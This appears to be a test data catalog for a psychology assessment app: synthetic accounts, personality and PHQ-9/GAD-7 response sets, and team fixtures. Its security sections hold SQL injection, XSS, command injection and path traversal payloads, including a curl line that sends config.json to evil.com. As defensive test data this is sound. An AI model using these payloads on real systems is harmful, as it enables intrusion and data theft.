# Test Data Catalog

## Overview

This document catalogs all test data used throughout the PsychSync test suite. All test data uses synthetic, anonymized information to ensure no real PII is present in the test environment.

**Test Email Domain:** `@psychsync.test`

---

## 1. Authentication Test Data

### 1.1 Valid User Accounts

#### Admin User
```json
{
  "email": "admin@psychsync.test",
  "password": "AdminPass123!",
  "role": "ADMIN",
  "full_name": "Test Admin User",
  "is_active": true,
  "is_verified": true,
  "two_factor_enabled": true
}
```

**Usage:** Administrative operations, user management, system configuration

#### Regular User
```json
{
  "email": "user@psychsync.test",
  "password": "UserPass123!",
  "role": "USER",
  "full_name": "Test Regular User",
  "is_active": true,
  "is_verified": true,
  "two_factor_enabled": false
}
```

**Usage:** Standard user operations, assessments, dashboard

#### Team Lead
```json
{
  "email": "lead@psychsync.test",
  "password": "LeadPass123!",
  "role": "TEAM_LEAD",
  "full_name": "Test Team Lead",
  "is_active": true,
  "is_verified": true,
  "two_factor_enabled": false,
  "teams": ["team-001", "team-002"]
}
```

**Usage:** Team management, member invitations, team analytics

#### Unverified User
```json
{
  "email": "unverified@psychsync.test",
  "password": "UnverifiedPass123!",
  "role": "USER",
  "full_name": "Test Unverified User",
  "is_active": true,
  "is_verified": false
}
```

**Usage:** Email verification flow testing

#### Inactive User
```json
{
  "email": "inactive@psychsync.test",
  "password": "InactivePass123!",
  "role": "USER",
  "full_name": "Test Inactive User",
  "is_active": false,
  "is_verified": true
}
```

**Usage:** Account reactivation, login rejection testing

### 1.2 Edge Case User Data

#### Weak Passwords (for validation testing)
```
- "password" (too common)
- "12345678" (all numbers)
- "abcdefgh" (all lowercase)
- "ABCDEFGH" (all uppercase)
- "Pass1" (too short)
```

#### SQL Injection Payloads
```json
[
  "admin' OR '1'='1",
  "admin'; DROP TABLE users; --",
  "admin' UNION SELECT * FROM passwords--",
  "1' OR '1'='1'--",
  "'; EXEC xp_cmdshell('dir'); --"
]
```

#### XSS Payloads
```json
[
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "<iframe src='javascript:alert(XSS)'>"
]
```

#### Email Format Edge Cases
```json
[
  "plaintext",
  "@psychsync.test",
  "user@",
  "user..name@psychsync.test",
  ".user@psychsync.test",
  "user.@psychsync.test",
  "user@.psychsync.test",
  "very.long.email.address." +
    "that.exceeds.the.maximum." +
    "length.of.two.hundred.and." +
    "fifty.four.characters@psychsync.test"
]
```

#### Unicode Characters
```json
{
  "email": "tëst@psychsync.test",
  "password": "中文密码123!",
  "full_name": "Тестовый Пользователь",
  "emoji": "Test User 😀🎉"
}
```

---

## 2. Assessment Test Data

### 2.1 MBTI Assessment Response Sets

#### INTJ Response Set
**Expected Result:** INTJ (Introverted, Intuitive, Thinking, Judging)

**Question Pattern (93 questions):**
- Introversion responses: 70%
- Intuition responses: 75%
- Thinking responses: 80%
- Judging responses: 70%

**Sample Responses:**
```json
{
  "assessment_id": "mbti-intj-001",
  "framework_code": "MBTI",
  "responses": [
    {"question_id": 1, "answer_value": "agree", "dimension": "E"},
    {"question_id": 2, "answer_value": "disagree", "dimension": "I"},
    {"question_id": 3, "answer_value": "agree", "dimension": "N"},
    {"question_id": 4, "answer_value": "disagree", "dimension": "S"},
    {"question_id": 5, "answer_value": "agree", "dimension": "T"},
    {"question_id": 6, "answer_value": "disagree", "dimension": "F"},
    {"question_id": 7, "answer_value": "agree", "dimension": "J"},
    {"question_id": 8, "answer_value": "disagree", "dimension": "P"},
    // ... 85 more questions
  ],
  "expected_result": {
    "type": "INTJ",
    "dimensions": {
      "EI": "I",
      "SN": "N",
      "TF": "T",
      "JP": "J"
    },
    "confidence": 0.85
  }
}
```

#### ENFP Response Set
**Expected Result:** ENFP (Extraverted, Intuitive, Feeling, Perceiving)

**Question Pattern:**
- Extraversion responses: 75%
- Intuition responses: 80%
- Feeling responses: 70%
- Perceiving responses: 75%

#### Complete Response Set (All 16 Types)
Available in `tests/test_data/mbti_responses.json`

### 2.2 Big Five (OCEAN) Response Sets

#### High Openness Profile
**Expected Result:** Openness > 85th percentile

```json
{
  "assessment_id": "bigfive-high-openness-001",
  "responses": [
    {"question_id": 1, "answer_value": 5, "facet": "ideas"},
    {"question_id": 2, "answer_value": 5, "facet": "curiosity"},
    {"question_id": 3, "answer_value": 4, "facet": "imagination"}
    // ... 44 questions total (IPIP-300)
  ],
  "expected_result": {
    "O": 85,
    "C": 60,
    "E": 55,
    "A": 65,
    "N": 45
  }
}
```

#### Balanced Profile (Mid-range all traits)
```json
{
  "expected_result": {
    "O": 50,
    "C": 50,
    "E": 50,
    "A": 50,
    "N": 50
  }
}
```

### 2.3 Enneagram Assessment Response Sets

#### Type 1 (The Perfectionist)
**Expected Result:** Type 1

```json
{
  "assessment_id": "enneagram-type1-001",
  "responses": [
    {"question_id": 1, "answer_value": "Very true", "type_tendency": "type1"},
    {"question_id": 2, "answer_value": "Somewhat true", "type_tendency": "other"},
    {"question_id": 10, "answer_value": "Very true", "type_tendency": "type1"}
    // ... 18 questions
  ],
  "expected_result": {
    "type": 1,
    "type_name": "The Perfectionist",
    "confidence": 0.82
  }
}
```

#### Type 5 (The Investigator)
**Expected Result:** Type 5

### 2.4 Clinical Assessment Response Sets

#### PHQ-9: Minimal Depression (Score 4)
**Expected Result:** Minimal depression symptoms

```json
{
  "assessment_id": "phq9-minimal-001",
  "framework_code": "PHQ9",
  "responses": [
    {"question_id": 1, "answer_value": 0},  // Little interest
    {"question_id": 2, "answer_value": 0},  // Feeling down
    {"question_id": 3, "answer_value": 0},  // Sleep problems
    {"question_id": 4, "answer_value": 1},  // Low energy
    {"question_id": 5, "answer_value": 0},  // Appetite changes
    {"question_id": 6, "answer_value": 0},  // Self-worth
    {"question_id": 7, "answer_value": 0},  // Concentration
    {"question_id": 8, "answer_value": 1},  // Moving slowly
    {"question_id": 9, "answer_value": 0}   // Self-harm thoughts
  ],
  "expected_result": {
    "total_score": 4,
    "severity": "Minimal",
    "recommendation": "Monitor",
    "crisis_detected": false
  }
}
```

#### PHQ-9: Severe Depression (Score 22)
**Expected Result:** Severe depression - requires immediate follow-up

```json
{
  "responses": [
    {"question_id": 1, "answer_value": 3},
    {"question_id": 2, "answer_value": 3},
    {"question_id": 3, "answer_value": 2},
    {"question_id": 4, "answer_value": 3},
    {"question_id": 5, "answer_value": 2},
    {"question_id": 6, "answer_value": 3},
    {"question_id": 7, "answer_value": 2},
    {"question_id": 8, "answer_value": 3},
    {"question_id": 9, "answer_value": 3}
  ],
  "expected_result": {
    "total_score": 22,
    "severity": "Severe",
    "recommendation": "Immediate clinical evaluation",
    "crisis_detected": false
  }
}
```

#### PHQ-9: Crisis Detected (Question 9)
**Expected Result:** CRISIS - Immediate intervention required

```json
{
  "responses": [
    {"question_id": 1, "answer_value": 2},
    {"question_id": 2, "answer_value": 2},
    // ... moderate depression symptoms
    {"question_id": 9, "answer_value": 3}  // Self-harm thoughts: "Nearly every day"
  ],
  "expected_result": {
    "total_score": 15,
    "severity": "Moderately severe",
    "crisis_detected": true,
    "recommendation": "IMMEDIATE CRISIS INTERVENTION",
    "crisis_resources": [
      "National Suicide Prevention Lifeline: 988",
      "Crisis Text Line: Text HOME to 741741",
      "Emergency: 911"
    ]
  }
}
```

#### GAD-7: Minimal Anxiety (Score 4)
```json
{
  "expected_result": {
    "total_score": 4,
    "severity": "Minimal"
  }
}
```

#### GAD-7: Severe Anxiety (Score 18)
```json
{
  "expected_result": {
    "total_score": 18,
    "severity": "Severe",
    "recommendation": "Clinical evaluation recommended"
  }
}
```

---

## 3. Team & Organization Test Data

### 3.1 Organization Structures

#### Organization A (Small)
```json
{
  "organization_id": "org-small-001",
  "name": "Test Organization A",
  "size": "small",
  "users": 10,
  "teams": [
    {
      "team_id": "team-a-001",
      "name": "Leadership Team",
      "members": 3,
      "lead": "lead@psychsync.test"
    },
    {
      "team_id": "team-a-002",
      "name": "Development Team",
      "members": 7,
      "lead": "dev.lead@psychsync.test"
    }
  ]
}
```

#### Organization B (Medium)
```json
{
  "organization_id": "org-medium-001",
  "name": "Test Organization B",
  "size": "medium",
  "users": 50,
  "teams": [
    {
      "team_id": "team-b-001",
      "name": "Executive Team",
      "members": 5
    },
    {
      "team_id": "team-b-002",
      "name": "Engineering Team",
      "members": 20
    },
    {
      "team_id": "team-b-003",
      "name": "Marketing Team",
      "members": 10
    },
    {
      "team_id": "team-b-004",
      "name": "Sales Team",
      "members": 15
    }
  ]
}
```

#### Organization C (Large)
```json
{
  "organization_id": "org-large-001",
  "name": "Test Organization C",
  "size": "large",
  "users": 100,
  "teams": 10,
  "departments": ["Engineering", "Sales", "Marketing", "HR", "Finance", "Operations"]
}
```

### 3.2 Role Variations

#### Multi-Team Lead
```json
{
  "email": "multiteam.lead@psychsync.test",
  "password": "MultiTeamPass123!",
  "role": "TEAM_LEAD",
  "teams": ["team-a-001", "team-b-002", "team-c-003"]
}
```

#### Regular Member
```json
{
  "email": "member@psychsync.test",
  "password": "MemberPass123!",
  "role": "MEMBER",
  "teams": ["team-a-002"]
}
```

#### Pending Invitation
```json
{
  "invitation_id": "invite-pending-001",
  "email": "invited.user@external.com",
  "team_id": "team-a-001",
  "role": "MEMBER",
  "status": "pending",
  "invited_by": "lead@psychsync.test",
  "invited_at": "2025-01-10T10:00:00Z",
  "expires_at": "2025-01-17T10:00:00Z"
}
```

---

## 4. Analytics & Reporting Test Data

### 4.1 Time Series Data

#### Assessment Completion Trends
```json
{
  "timeframe": "30_days",
  "data_points": [
    {"date": "2024-12-12", "completions": 45},
    {"date": "2024-12-13", "completions": 52},
    {"date": "2024-12-14", "completions": 38},
    // ... 30 data points
    {"date": "2025-01-10", "completions": 67}
  ]
}
```

### 4.2 Aggregated Analytics

#### Team Composition Distribution
```json
{
  "team_id": "team-a-002",
  "personality_types": {
    "INTJ": 3,
    "ENFP": 5,
    "ISTJ": 2,
    "ENTP": 4,
    "other": 6
  },
  "big_five_averages": {
    "O": 65,
    "C": 58,
    "E": 62,
    "A": 70,
    "N": 45
  }
}
```

---

## 5. Performance & Load Test Data

### 5.1 Concurrent User Simulation

#### User Behavior Profiles
```json
{
  "profile_a": {
    "name": "Assessment Taker",
    "weight": 0.40,
    "actions": ["start_assessment", "submit_responses", "view_results"],
    "think_time_min": 2,
    "think_time_max": 5
  },
  "profile_b": {
    "name": "Dashboard Viewer",
    "weight": 0.20,
    "actions": ["view_dashboard", "refresh_analytics"],
    "think_time_min": 5,
    "think_time_max": 15
  },
  "profile_c": {
    "name": "Team Manager",
    "weight": 0.15,
    "actions": ["view_teams", "add_member", "view_analytics"],
    "think_time_min": 3,
    "think_time_max": 8
  }
}
```

### 5.2 Stress Test Scenarios

#### Cache Stampede Trigger
```json
{
  "scenario": "cache_stampede",
  "concurrent_requests": 100,
  "cache_key": "popular_assessment_data",
  "expected_behavior": "Redis lock prevents multiple computations"
}
```

---

## 6. Integration Test Data

### 6.1 External Service Mocks

#### Slack Integration
```json
{
  "webhook_url": "https://hooks.slack.com/services/T000/B000/XXXX",
  "mock_responses": {
    "success": {
      "ok": true,
      "ts": "1234567890.123456"
    },
    "rate_limited": {
      "ok": false,
      "error": "rate_limited"
    }
  }
}
```

#### Email Service
```json
{
  "mock_emails": [
    {
      "to": "user@psychsync.test",
      "subject": "Verify your email",
      "template": "email_verification",
      "expected_send_time": "2025-01-10T14:30:00Z"
    }
  ]
}
```

---

## 7. Security Test Data

### 7.1 Malicious Payloads

#### Command Injection Attempts
```json
[
  "; ls -la",
  "| cat /etc/passwd",
  "$(whoami)",
  "`id`",
  "; curl http://evil.com/steal?data=$(cat config.json)"
]
```

#### Path Traversal
```json
[
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2fetc%2fpasswd"
]
```

### 7.2 Authentication Attack Patterns

#### Brute Force Attempts
```json
{
  "target_email": "user@psychsync.test",
  "passwords": [
    "password123",
    "Password123!",
    "User@2024",
    "psychsync2024",
    "Test1234!",
    "admin123",
    "welcome1",
    "password1"
  ],
  "expected_behavior": "Account locked after 10 failed attempts"
}
```

---

## 8. Data Refresh Strategies

### 8.1 Factory Boy Factories

#### User Factory
```python
# tests/test_data/factories.py
import factory
from app.db.models.user import User

class UserFactory(factory.Factory):
    class Meta:
        model = User

    email = factory.Faker('email')
    full_name = factory.Faker('name')
    hashed_password = "$2b$12$..."  # Pre-hashed test password
    is_active = True
    is_verified = True

class AdminUserFactory(UserFactory):
    role = "ADMIN"
    email = factory.Sequence(lambda n: f"admin{n}@psychsync.test")

class UnverifiedUserFactory(UserFactory):
    is_verified = False
```

#### Assessment Factory
```python
class AssessmentFactory(factory.Factory):
    class Meta:
        model = Assessment

    framework_code = "MBTI"
    user_id = factory.SubFactory(UserFactory)
    status = "in_progress"
```

### 8.2 Database Seeding Scripts

#### Quick Test Data Setup
```bash
# Seed database with test data
python scripts/seed_test_data.py --environment=test \
  --users=50 \
  --organizations=5 \
  --teams=20 \
  --assessments=100
```

---

## 9. Test Data Cleanup

### 9.1 Cleanup Procedures

#### After Each Test
```python
@pytest.fixture(autouse=True)
async def cleanup_test_data(db_session: AsyncSession):
    """Clean up test data after each test"""
    yield
    await db_session.rollback()
    # Delete all records with @psychsync.test email
    await db_session.execute(
        delete(User).where(User.email.like("%@psychsync.test"))
    )
```

#### After Test Suite
```bash
# Clean entire test database
pytest --cleanup-database
# Or reset to known state
alembic upgrade head --environment=test
```

---

## 10. Data Privacy & Compliance

### 10.1 PII Sanitization Rules

#### Never Use in Test Data
- Real email addresses
- Real phone numbers
- Real addresses
- Real names
- Real clinical data
- Real credit card numbers

#### Always Use Synthetic Data
- Generated emails: `user123@psychsync.test`
- Fake names: Use Faker library
- Test phone: `+1 (555) 123-4567`
- Test addresses: `123 Test Street, Test City, TC 12345`
- Synthetic SSN: `999-99-9999` (not valid range)

### 10.2 Clinical Test Data Compliance

#### PHQ-9/GAD-7 Test Data
- All responses are **synthetic**
- Scores are **predetermined** for testing
- No real patient information
- Test data clearly marked: `*** TEST DATA - NOT A REAL PATIENT ***`

#### Crisis Detection Testing
- Use safe test values that trigger crisis alerts
- Verify crisis resources are displayed correctly
- Never use real crisis scenarios

---

## Appendix: Test Data Files

### Available JSON Files
```
tests/test_data/
├── users.json                    # User account fixtures
├── mbti_responses.json          # All 16 MBTI type response sets
├── big_five_responses.json      # OCEAN profile variations
├── enneagram_responses.json     # All 9 Enneagram type response sets
├── clinical_responses.json      # PHQ-9, GAD-7 scored responses
├── organizations.json            # Organization structures
├── teams.json                    # Team configurations
└── analytics.json                # Analytics test data
```

### Usage Examples
```python
# Load test data in tests
import json

def load_mbti_responses():
    with open('tests/test_data/mbti_responses.json') as f:
        return json.load(f)

def get_intj_response_set():
    responses = load_mbti_responses()
    return responses['INTJ']
```

---

**Document Version:** 1.0
**Last Updated:** 2025-01-10
**Next Review:** 2025-02-10
